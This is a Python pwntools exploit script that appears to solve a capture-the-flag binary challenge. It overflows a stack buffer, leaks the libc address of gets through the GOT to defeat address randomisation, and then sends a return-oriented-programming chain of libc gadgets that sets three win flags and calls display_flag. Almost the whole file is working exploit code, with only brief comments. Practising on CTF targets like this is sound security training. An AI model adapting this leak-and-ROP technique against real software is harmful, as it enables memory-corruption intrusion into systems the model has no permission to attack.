#!/usr/bin/python2

import os
from pwn import *
context.log_level = 'debug'

# os.chrdir('/problems/leap-frog_6_772f62cb51a325a368a9d1563bf4058')

# The first buffer will leak the libc address of gets, call gets again, and 'leave' will stack pivot to 0x804a16c.
# The second buffer will be written at 0x804a150. It will set the 3 win booleans and call display_flag.

EBP = p32(0xff8a9900)
vuln_printf = p32(0x080487ad)
percents = p32(0x8048935)
got_gets = p32(0x804a010)

buf1 = "A"*24
buf1 += EBP
buf1 += vuln_printf + percents + got_gets

# binary
proc = process('./rop')
raw_input("Attach GDB now..")
proc.sendline(buf1)

# retrieve gets address (works both with and without breakpoints before printf is called)
r1 = proc.recv()
if len(r1) != 18:
	# no breakpoints
	print 'no breakpoints!'
	gets_address = r1[18:22]
else:
	# breakpoints
	r2 = proc.recv()
	print 'breakpoints!'
	gets_address = r2[:4]
print gets_address[::-1].encode('hex')
gets_address_int = int(gets_address[::-1].encode('hex'), 16)

# calc libc base
e = ELF('/lib32/libc.so.6')
libc_base = gets_address_int - e.symbols['gets']
print 'libc base:', p32(libc_base)

# # Manually verify correctness of the libc base
# print 'printf: ', p32(libc_base + e.symbols['printf'])[::-1].encode('hex')
# print 'gets: ', p32(libc_base + e.symbols['gets'])[::-1].encode('hex')
# print 'getegid: ', p32(libc_base + e.symbols['getegid'])[::-1].encode('hex')

# local gadgets
pop_ecx_eax = p32(libc_base + 0x000feea0)		# pop ecx; pop eax; ret;
write_at_eax = p32(libc_base + 0x0003162e)		# mov dword ptr [eax], ecx; ret;
inc_eax = p32(libc_base + 0x00044a30)			# inc eax; ret; 

# # remote gadgets
# pop_ecx_eax = p32(libc_base + 0x000faa50)		# pop ecx; pop eax; ret; 
# write_at_eax = p32(libc_base + 0x0002be5e)		# mov dword ptr [eax], ecx; ret;
# inc_eax = p32(libc_base + 0x0003f75e)			# inc eax; ret;

display_flag = p32(0x080486b3)

# eax = 0x804a000
# win1: +3d
# win2: +3e
# win3: +3f

buf2 = 'A'*28 		# junk
buf2 += pop_ecx_eax + p32(1) + p32(0x804a03d)
buf2 += write_at_eax
buf2 += inc_eax + write_at_eax
buf2 += inc_eax + write_at_eax
buf2 += display_flag*5

proc.sendline(buf2)
for i in range(5):
	print i, proc.recv()

raw_input("Waiting to kill process...")
proc.close()
